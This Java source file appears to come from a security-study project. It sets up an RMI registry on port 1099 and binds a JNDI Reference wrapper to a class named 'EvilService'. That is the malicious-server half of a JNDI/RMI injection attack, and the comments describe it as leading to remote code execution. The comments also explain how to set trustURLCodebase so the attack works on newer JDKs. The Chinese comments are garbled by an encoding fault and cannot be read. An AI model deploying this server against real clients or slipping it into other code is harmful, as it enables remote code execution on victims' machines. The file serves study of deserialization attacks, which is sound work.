package test_project.basic.rmi;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class Test_registryService {
	
	public static void main(String[] args) {
		Test_registryService testService = new Test_registryService();
		testService.testServerRegistryService();
	}
	
	/**
	 * ע�᱾�ض���RMI����
	 */
	public void testLocalRegistryService() {
		try {
			//���������ϵ�Զ�̶���ע���Registry��ʵ��,Ĭ�϶˿�1099
			Registry registry = LocateRegistry.createRegistry(1099);
			//����һ��Զ�̶���
			EvilRemoteService evilRemoteService = new EvilRemoteServiceImpl();
			//��Զ�̶���ע�ᵽRMIע��������ϣ�������ΪEvilRemoteService
			registry.bind("EvilRemoteService", evilRemoteService);
			//registry.rebind("EvilRemoteService", evilRemoteService);
			System.out.println("����RMI����ɹ�~~~");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	/**
	 * ע��Զ�̷���������RMI����
	 * �ο���https://paper.seebug.org/1207/
	 */
	public void testServerRegistryService() {
		try {
			//���������ϵ�Զ�̶���ע���Registry��ʵ��,Ĭ�϶˿�1099
			Registry registry = LocateRegistry.createRegistry(1099);
			
			/**
			 * �򵥽�����Reference������þ��Ǽ�¼һ��Զ�̶����λ�ã�
			 * Ȼ�����˽�ʵ�����õ�Reference��ͨ��bind����ע�ᵽrmiregistry�ϣ�
			 * Ȼ��ͻ���ͨ��rmi registry���ص�Stub��Ϣ�ҵ�����˲����ø�Reference����
			 * Reference����ͨ��URLClassloader����¼��Reference�����е�Class��Զ�̵�ַ�ϼ��ص����أ�
			 * �Ӷ������������еľ�̬����飬����RCE
			 */
	        // ���� JNDI ������
	        // className Զ�̶���������ƣ�����Ϊnull
	        // factory ������ɹ���Ҫʵ������������
	        // factoryLocation �ṩ���ļ��ĵ�ַ��Ϊnullʱ�ӱ��ؼ���
			Reference reference = new Reference("test_project.basic.rmi.EvilService", "test_project.basic.rmi.EvilService", null);
			/**
			 * com.sun.jndi.rmi.registry.ReferenceWrapper;
			 * jdk11�Ѿ��޷�����ö���
			 * jdk8u121��7u131��6u141�汾��ʼĬ��com.sun.jndi.rmi.object.trustURLCodebase����Ϊfalse��rmi����Զ�̵��ֽ��벻��ִ�гɹ���
			 * �����Ҫ�ڸ߰汾��JDK��ִ�У���Ҫ����com.sun.jndi.rmi.object.trustURLCodebase=true ��
			 * ���磺IDEA: Run -> edit configurations -> VM options �����-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
			 */
			//�� JNDI���� ��װΪ RMI ��ע����࣬���̳�UnicastRemoteObject�࣬ʵ��Remote�ӿڣ��׳�RemoteException�쳣
			ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
			
			//����ʵ���Զ���ReferenceWrapper
			//CustomReferenceWrapper referenceWrapper = new CustomReferenceWrapper(reference);
			
			//��Զ�̶���ע�ᵽRMIע��������ϣ�������ΪEvilRemoteService
			registry.bind("EvilService", referenceWrapper);
			//registry.rebind("EvilRemoteService", evilRemoteService);
			System.out.println("����RMI����ɹ�~~~");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
}
